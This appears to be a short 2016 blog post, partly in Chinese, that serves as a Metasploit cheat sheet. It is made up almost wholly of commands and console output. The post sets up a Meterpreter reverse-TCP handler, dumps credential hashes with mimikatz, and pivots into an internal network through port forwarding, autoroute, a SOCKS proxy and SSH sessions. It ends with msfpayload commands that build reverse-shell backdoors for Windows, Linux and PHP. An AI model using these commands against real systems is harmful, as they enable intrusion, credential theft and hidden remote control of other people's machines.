---
title: meterpreter
date: 2016-04-19 02:24:02
tags: MSF
---


```
msf payload(reverse_tcp) > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.100.10
LHOST => 192.168.100.10
msf exploit(handler) > set LPORT 9876
LPORT => 9876
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.10     yes       The listen address
   LPORT     9876             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
<!--more-->
```
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.100.10:9876
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 125.93.255.238
[*] Meterpreter session 1 opened (192.168.100.10:9876 -> 192.168.100.11:36791) at 2016-04-18 18:10:44 +0000
meterpreter > load mimikatz
Loading extension mimikatz...success.
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID        Package    Domain        User             Password
------        -------    ------        ----             --------
0;996         Negotiate  NT AUTHORITY  NETWORK SERVICE  lm{ 00000000000000000000000000000000 }, ntlm{ ed5acedffb143ae2891297a0ee6edbd4 }
0;40038       NTLM                                      lm{ 00000000000000000000000000000000 }, ntlm{ ed5acedffb143ae2891297a0ee6edbd4 }
0;178855791   NTLM       test         test           lm{ 105d3b39eb090becaad3b435b51404ee }, ntlm{ 94bd6647b8ae32f031132da60c8a14a1 }
0;102678      Kerberos   test          Administrator    lm{ f23b77146540432ee72c57ef50f76a05 }, ntlm{ db28660dad750313c2c821c6ea654625 }
0;1905802495  Kerberos   test          Administrator    lm{ f23b77146540432ee72c57ef50f76a05 }, ntlm{ db28660dad750313c2c821c6ea654625 }
0;90339       Kerberos   test          Administrator    lm{ f23b77146540432ee72c57ef50f76a05 }, ntlm{ db28660dad750313c2c821c6ea654625 }
0;162912695   Kerberos   test          Administrator    lm{ f23b77146540432ee72c57ef50f76a05 }, ntlm{ db28660dad750313c2c821c6ea654625 }
0;109899      Kerberos   test          Administrator    lm{ f23b77146540432ee72c57ef50f76a05 }, ntlm{ db28660dad750313c2c821c6ea654625 }
0;142571      Kerberos   test          Administrator    lm{ f23b77146540432ee72c57ef50f76a05 }, ntlm{ db28660dad750313c2c821c6ea654625 }
0;997         Negotiate  NT AUTHORITY  LOCAL SERVICE    n.s. (Credentials KO)
0;999         Negotiate  test          QUEEN$           n.s. (Credentials KO)

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID        Package    Domain        User             Password
------        -------    ------        ----             --------
0;1905802495  Kerberos   test          Administrator
0;90339       Kerberos   test          Administrator
0;162912695   Kerberos   test          Administrator
0;142571      Kerberos   test          Administrator
0;109899      Kerberos   test          Administrator
meterpreter > wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID        Package    Domain        User             Password
------        -------    ------        ----             --------

meterpreter > portfwd add -l 1234 -p 3389 -r 10.42.0.54
#将远程主机10.42.0.54 3389端口转发到本机vps1234端口上
[*] Local TCP relay created: 0.0.0.0:8081 <-> 10.42.0.54:80

meterpreter > run autoroute -s 10.42.0.54
[*] Adding a route to 10.42.0.54/255.255.255.0...
[+] Added route to 10.42.0.54/255.255.255.0 via 10.42.0.54
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options    

Module options (auxiliary/server/socks4a):
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
SRVHOST  0.0.0.0          yes       The address to listen on
SRVPORT  1080             yes       The port to listen on.    

Auxiliary action:
Name   Description
----   -----------
Proxy      

msf auxiliary(socks4a) > route print
Active Routing Table
====================
Subnet             Netmask            Gateway
------             -------            -------
10.42.0.54         255.255.255.0      Session 1    

msf auxiliary(socks4a) > ifconfig
[*] exec: ifconfig    

msf auxiliary(socks4a) > set SRVHOST xxx.xxx.xx.xx
SRVHOST => xxx.xxx.xx.xx (xxx.xxx.xx.xx为自己运行msf的vps机子)    

msf auxiliary(socks4a) > exploit
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
之后使用proxychains 设置socks4代理 链接vps上的1080端口 就可以访问内网了
```
SSH代理
```
msf > load meta_ssh
msf > use multi/ssh/login_password
msf > set RHOST 10.42.0.54
RHOST => 10.42.0.54
msf > set USER test
USER => test
msf > set PASS reverse
PASS => reverse
msf > set PAYLOAD ssh/metassh_session
PAYLOAD => ssh/metassh_session
msf > exploit -z
[*] Connecting to dsl@10.42.0.54:22 with password reverse
[*] metaSSH session 1 opened (127.0.0.1 -> 10.42.0.54:22) at 2011-12-28   03:51:16 +1300
[*] Session 1 created in the background.
msf > route add 10.42.0.54 255.255.255.0 1
```
生成后门程序
```
> msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe   #window backdoor
> msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell   #linux backdoor
> msfpayload php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -e php/base64(可简单编码) -t raw -o base64php.php   #php backdoor
```